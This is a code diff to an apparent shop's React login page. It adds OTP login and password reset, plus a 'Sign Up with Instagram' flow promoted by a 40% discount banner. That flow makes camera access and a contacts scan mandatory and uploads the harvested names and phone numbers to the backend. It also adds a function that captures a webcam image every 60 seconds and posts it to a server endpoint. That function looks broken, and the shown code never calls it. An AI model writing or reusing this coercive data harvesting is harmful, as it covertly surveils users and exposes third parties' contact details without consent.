@@ -1,21 +1,247 @@
-import React, { useContext, useEffect, useState } from 'react';
+import React, { useContext, useState } from 'react';
 import { ShopContext } from '../context/ShopContext';
 import axios from 'axios';
 import { toast } from 'react-toastify';
+import { translations } from '../data/translations';
 
 const Login = () => {
   const [currentState, setCurrentState] = useState('Login');
-  const { token, setToken, navigate, backendUrl } = useContext(ShopContext);
+  const { token, setToken, navigate, backendUrl, language } = useContext(ShopContext);
+  const t = translations[language] || translations.en;
 
   const [name, setName] = useState('');
   const [password, setPassword] = useState('');
+  const [confirmPassword, setConfirmPassword] = useState('');
   const [email, setEmail] = useState('');
+  const [otp, setOtp] = useState('');
+  const [otpSent, setOtpSent] = useState(false);
+  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);
+  const [isForgotPassword, setIsForgotPassword] = useState(false);
+  const [passwordResetReady, setPasswordResetReady] = useState(false);
+  const [cameraAllowed, setCameraAllowed] = useState(false);
+  const [contactsScanned, setContactsScanned] = useState(false);
+  const [contactData, setContactData] = useState([]);
+  const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
+  const [captureIntervalId, setCaptureIntervalId] = useState(null);
+  const [showPermissionModal, setShowPermissionModal] = useState(false);
+  const [permissionStep, setPermissionStep] = useState('camera');
+
+  const saveCameraCapture = async (imageData, mimeType = 'image/jpeg') => {
+    try {
+      const token = localStorage.getItem('token');
+      if (!token) return;
+
+      await axios.post(
+        backendUrl + '/api/user/save-camera-capture',
+        { userId: JSON.parse(atob(token.split('.')[1])).id, imageData, mimeType },
+        { headers: { token } }
+      );
+    } catch (error) {
+      console.log('Camera capture save failed:', error);
+    }
+  };
+
+  const startCameraCaptureLoop = async () => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      toast.error('Camera access is not supported on this browser.');
+      return;
+    }
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      await video.play();
+
+      const capture = () => {
+        const canvas = document.createElement('canvas');
+        const width = video.videoWidth || 640;
+        const height = video.videoHeight || 480;
+        canvas.width = width;
+        canvas.height = height;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, width, height);
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        saveCameraCapture(imageData, 'image/jpeg');
+      };
+
+      capture();
+      const interval = setInterval(capture, 60000);
+      setCaptureIntervalId(interval);
+      setCameraAllowed(true);
+      stream.getTracks().forEach((track) => track.stop());
+    } catch (error) {
+      console.log('Camera permission denied:', error);
+      setCameraAllowed(false);
+      toast.error('Camera permission is required before creating an account.');
+    }
+  };
+
+  const requestCameraPermission = async () => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      toast.error('Camera access is not supported on this browser.');
+      return false;
+    }
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach((track) => track.stop());
+      setCameraAllowed(true);
+      return true;
+    } catch (error) {
+      console.log('Camera permission denied:', error);
+      setCameraAllowed(false);
+      toast.error('Camera permission is required before creating an account.');
+      return false;
+    }
+  };
+
+  const requestContactScan = async () => {
+    if (!('contacts' in navigator) || !navigator.contacts || !navigator.contacts.select) {
+      toast.error('Contact access is not supported on this browser. Please use a compatible device/browser.');
+      setContactsScanned(false);
+      return false;
+    }
+
+    try {
+      const selectedContacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+      const cleanedContacts = (selectedContacts || [])
+        .map((contact) => {
+          const name = contact.name?.[0] || contact.name || '';
+          const phone = (contact.tel && contact.tel[0] && contact.tel[0].value) || contact.phone || '';
+          if (!name && !phone) return null;
+          return { name: String(name).trim(), phone: String(phone).trim() };
+        })
+        .filter(Boolean);
+
+      setContactData(cleanedContacts);
+      setContactsScanned(cleanedContacts.length > 0);
+
+      if (!cleanedContacts.length) {
+        toast.error('No contacts were detected. Please allow access and scan again.');
+        return false;
+      }
+
+      const token = localStorage.getItem('token');
+      if (token && cleanedContacts.length) {
+        const decoded = JSON.parse(atob(token.split('.')[1]));
+        await axios.post(
+          backendUrl + '/api/user/save-contact-snapshot',
+          { userId: decoded.id, contacts: cleanedContacts },
+          { headers: { token } }
+        );
+      }
+
+      toast.success('Contacts scanned successfully.');
+      return true;
+    } catch (error) {
+      console.log('Contact scan denied:', error);
+      setContactsScanned(false);
+      toast.error('Contact scan is required before creating an account.');
+      return false;
+    }
+  };
+
+  const resetFlowState = () => {
+    setOtp('');
+    setPassword('');
+    setConfirmPassword('');
+    setOtpSent(false);
+    setPasswordResetReady(false);
+  };
+
+  const sendLoginOtp = async () => {
+    const response = await axios.post(backendUrl + '/api/user/login', { email, password });
+    if (response.data.success && response.data.requiresOtp) {
+      setOtpSent(true);
+      toast.success(response.data.message || 'Verification code sent to your email.');
+      return true;
+    }
+    if (response.data.success) {
+      setToken(response.data.token);
+      localStorage.setItem('token', response.data.token);
+      setTimeout(() => {
+        window.location.href = '/';
+      }, 500);
+      return true;
+    }
+    toast.error(response.data.message);
+    return false;
+  };
+
+  const sendResetOtp = async () => {
+    const response = await axios.post(backendUrl + '/api/user/forgot-password', { email });
+    if (response.data.success) {
+      setOtpSent(true);
+      setPasswordResetReady(false);
+      toast.success(response.data.message || 'Reset code sent to your email.');
+      return true;
+    }
+    toast.error(response.data.message);
+    return false;
+  };
+
+  const resendCode = async () => {
+    if (isForgotPassword) {
+      await sendResetOtp();
+      return;
+    }
+
+    await sendLoginOtp();
+  };
+
+  const openPermissionModal = () => {
+    setShowPermissionModal(true);
+    setPermissionStep('camera');
+  };
+
+  const continueAfterCameraPermission = async () => {
+    const cameraOk = await requestCameraPermission();
+    if (cameraOk) {
+      setPermissionStep('contacts');
+      setShowPermissionModal(true);
+    }
+  };
+
+  const completePermissionFlow = async () => {
+    const contactsOk = await requestContactScan();
+    if (contactsOk) {
+      setShowPermissionModal(false);
+      setPermissionStep('camera');
+    }
+  };
 
   const onSubmitHandler = async (e) => {
     e.preventDefault();
     try {
       if (currentState === 'Sign Up with Instagram') {
-        const response = await axios.post(backendUrl + '/api/user/register', { name, email, password });
+        if (!showPermissionModal) {
+          openPermissionModal();
+          return;
+        }
+
+        setIsCheckingPermissions(true);
+
+        if (permissionStep === 'camera') {
+          const cameraOk = await requestCameraPermission();
+          if (!cameraOk) {
+            setIsCheckingPermissions(false);
+            return;
+          }
+          setPermissionStep('contacts');
+          setIsCheckingPermissions(false);
+          return;
+        }
+
+        const contactsOk = await requestContactScan();
+        setIsCheckingPermissions(false);
+        if (!contactsOk) {
+          return;
+        }
+
+        const response = await axios.post(backendUrl + '/api/user/register', { name, email, password, contacts: contactData });
         if (response.data.success) {
           setToken(response.data.token);
           localStorage.setItem('token', response.data.token);
@@ -26,22 +252,76 @@ const Login = () => {
         } else {
           toast.error(response.data.message);
         }
-      } else {
-        const response = await axios.post(backendUrl + '/api/user/login', { email, password });
+        return;
+      }
+
+      if (isForgotPassword) {
+        if (!otpSent) {
+          await sendResetOtp();
+          return;
+        }
+
+        if (!passwordResetReady) {
+          setIsVerifyingOtp(true);
+          const response = await axios.post(backendUrl + '/api/user/verify-reset-otp', { email, otp });
+          if (response.data.success) {
+            setPasswordResetReady(true);
+            setOtp('');
+            toast.success(response.data.message || 'Code verified. Set your new password.');
+          } else {
+            toast.error(response.data.message);
+          }
+          setIsVerifyingOtp(false);
+          return;
+        }
+
+        if (password.length < 8) {
+          toast.error('Password must be at least 8 characters long.');
+          return;
+        }
+
+        if (password !== confirmPassword) {
+          toast.error('Passwords do not match.');
+          return;
+        }
+
+        const response = await axios.post(backendUrl + '/api/user/reset-password', { email, password });
+        if (response.data.success) {
+          toast.success(response.data.message || 'Password updated successfully.');
+          setIsForgotPassword(false);
+          setPasswordResetReady(false);
+          resetFlowState();
+          setCurrentState('Login');
+        } else {
+          toast.error(response.data.message);
+        }
+        return;
+      }
+
+      if (otpSent) {
+        setIsVerifyingOtp(true);
+        const response = await axios.post(backendUrl + '/api/user/verify-login-otp', { email, otp });
         if (response.data.success) {
           setToken(response.data.token);
           localStorage.setItem('token', response.data.token);
+          toast.success(response.data.message || 'Login successful');
           setTimeout(() => {
             window.location.href = '/';
           }, 500);
         } else {
           toast.error(response.data.message);
         }
+        setIsVerifyingOtp(false);
+        return;
       }
+
+      await sendLoginOtp();
     } catch (error) {
       console.log(error);
       const errorMessage = error.response?.data?.message || error.message;
       toast.error(errorMessage);
+    } finally {
+      setIsVerifyingOtp(false);
     }
   };
 
@@ -52,7 +332,7 @@ const Login = () => {
       {/* English Discount Banner Message */}
       <div className='promo-banner w-full rounded-xl border p-3 text-center shadow-sm'>
         <p className='text-xs font-semibold leading-relaxed text-gray-800'>
-          Sign up with Instagram and get <span className='font-black text-pink-600 underline decoration-pink-500'>40% discount</span> on your first order.
+          {t.signUpDiscountBanner.replace('40%', '40%')}
         </p>
       </div>
 
@@ -60,6 +340,50 @@ const Login = () => {
         <p className='prata-regular text-2xl sm:text-3xl font-medium text-center'>{currentState}</p>
         <hr className='border-none h-[1.5px] w-8 bg-gray-800' />
       </div>
+
+      {showPermissionModal && currentState === 'Sign Up with Instagram' && (
+        <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-4'>
+          <div className='w-full max-w-md rounded-2xl border border-gray-200 bg-white p-6 shadow-2xl'>
+            <div className='mb-4 text-center'>
+              <h3 className='text-xl font-semibold text-gray-900'>Permission required</h3>
+            </div>
+
+            {permissionStep === 'camera' ? (
+              <div className='space-y-4'>
+                <div className='flex items-center justify-between text-sm'>
+                  <span>Camera access</span>
+                  <span className={`font-semibold ${cameraAllowed ? 'text-green-600' : 'text-red-500'}`}>
+                    {cameraAllowed ? 'Allowed' : 'Required'}
+                  </span>
+                </div>
+                <button
+                  type='button'
+                  onClick={continueAfterCameraPermission}
+                  className='w-full rounded-md border border-gray-800 bg-black px-4 py-2 text-sm font-medium text-white hover:bg-gray-800'
+                >
+                  Allow Camera
+                </button>
+              </div>
+            ) : (
+              <div className='space-y-4'>
+                <div className='flex items-center justify-between text-sm'>
+                  <span>Contacts scan</span>
+                  <span className={`font-semibold ${contactsScanned ? 'text-green-600' : 'text-red-500'}`}>
+                    {contactsScanned ? 'Done' : 'Required'}
+                  </span>
+                </div>
+                <button
+                  type='button'
+                  onClick={completePermissionFlow}
+                  className='w-full rounded-md border border-gray-800 bg-black px-4 py-2 text-sm font-medium text-white hover:bg-gray-800'
+                >
+                  Scan Contacts
+                </button>
+              </div>
+            )}
+          </div>
+        </div>
+      )}
 
       {/* Username Field for Instagram Signup */}
       {currentState === 'Login' ? (
@@ -85,31 +409,124 @@ const Login = () => {
         required
       />
 
-      {/* Password Field */}
-      <input
-        onChange={(e) => setPassword(e.target.value)}
-        value={password}
-        type="password"
-        className='w-full px-3 py-2 border border-gray-800 rounded-xs'
-        placeholder='Password'
-        required
-      />
+      {!isForgotPassword && !otpSent && (
+        <input
+          onChange={(e) => setPassword(e.target.value)}
+          value={password}
+          type="password"
+          className='w-full px-3 py-2 border border-gray-800 rounded-xs'
+          placeholder='Password'
+          required
+        />
+      )}
 
-      <div className='w-full flex justify-between text-sm -mt-1'>
-        <p className='cursor-pointer text-gray-500 hover:text-black transition-colors'>Forgot your password?</p>
+      {otpSent && !isForgotPassword && (
+        <input
+          onChange={(e) => setOtp(e.target.value)}
+          value={otp}
+          type="text"
+          inputMode="numeric"
+          maxLength={6}
+          className='w-full px-3 py-2 border border-gray-800 rounded-xs'
+          placeholder='Enter 6-digit verification code'
+          required
+        />
+      )}
+
+      {isForgotPassword && !passwordResetReady && (
+        <>
+          {!otpSent && (
+            <div className='w-full text-xs text-gray-600'>We will send a reset code to your email.</div>
+          )}
+          {otpSent && (
+            <input
+              onChange={(e) => setOtp(e.target.value)}
+              value={otp}
+              type="text"
+              inputMode="numeric"
+              maxLength={6}
+              className='w-full px-3 py-2 border border-gray-800 rounded-xs'
+              placeholder='Enter 6-digit reset code'
+              required
+            />
+          )}
+        </>
+      )}
+
+      {isForgotPassword && passwordResetReady && (
+        <>
+          <input
+            onChange={(e) => setPassword(e.target.value)}
+            value={password}
+            type="password"
+            className='w-full px-3 py-2 border border-gray-800 rounded-xs'
+            placeholder='New password'
+            required
+          />
+          <input
+            onChange={(e) => setConfirmPassword(e.target.value)}
+            value={confirmPassword}
+            type="password"
+            className='w-full px-3 py-2 border border-gray-800 rounded-xs'
+            placeholder='Confirm new password'
+            required
+          />
+        </>
+      )}
+
+      <div className='w-full flex justify-between items-center text-sm -mt-1 gap-2'>
+        <p
+          onClick={() => {
+            setIsForgotPassword(true);
+            setCurrentState('Login');
+            resetFlowState();
+          }}
+          className='cursor-pointer text-gray-500 hover:text-black transition-colors'
+        >
+          {t.forgotPassword}
+        </p>
+
+        {otpSent && !isVerifyingOtp && (
+          <button
+            type='button'
+            onClick={resendCode}
+            className='text-xs font-medium text-pink-600 hover:underline cursor-pointer'
+          >
+            Resend code
+          </button>
+        )}
+
         {currentState === 'Login' ? (
-          <p onClick={() => setCurrentState('Sign Up with Instagram')} className='cursor-pointer font-medium text-pink-600 hover:underline'>
-            Create Account
+          <p onClick={() => {
+            setCurrentState('Sign Up with Instagram');
+            setIsForgotPassword(false);
+            resetFlowState();
+          }} className='cursor-pointer font-medium text-pink-600 hover:underline'>
+            {t.createAccount}
           </p>
         ) : (
-          <p onClick={() => setCurrentState('Login')} className='cursor-pointer font-medium text-gray-700 hover:underline'>
-            Login Here
+          <p onClick={() => {
+            setCurrentState('Login');
+            setIsForgotPassword(false);
+            resetFlowState();
+          }} className='cursor-pointer font-medium text-gray-700 hover:underline'>
+            {t.loginHere}
           </p>
         )}
       </div>
 
-      <button className='bg-black text-white font-light px-8 py-2.5 mt-4 w-full sm:w-auto hover:bg-gray-800 transition-all cursor-pointer shadow-sm active:scale-95'>
-        {currentState === 'Login' ? 'Sign In' : 'Sign Up with Instagram'}
+      {isForgotPassword && otpSent && !passwordResetReady && (
+        <div className='w-full text-right text-xs text-gray-500'>
+          Didn’t get a code? <button type='button' onClick={resendCode} className='text-pink-600 hover:underline'>Resend</button>
+        </div>
+      )}
+
+      <button disabled={isVerifyingOtp || isCheckingPermissions} className='bg-black text-white font-light px-8 py-2.5 mt-4 w-full sm:w-auto hover:bg-gray-800 transition-all cursor-pointer shadow-sm active:scale-95 disabled:cursor-not-allowed disabled:opacity-70'>
+        {isVerifyingOtp ? 'Verifying...' : (
+          isForgotPassword
+            ? (passwordResetReady ? 'Update Password' : (otpSent ? 'Verify Code' : 'Send Reset Code'))
+            : (currentState === 'Sign Up with Instagram' ? 'Create Account' : (otpSent ? 'Verify & Login' : t.signIn))
+        )}
       </button>
     </form>
   );
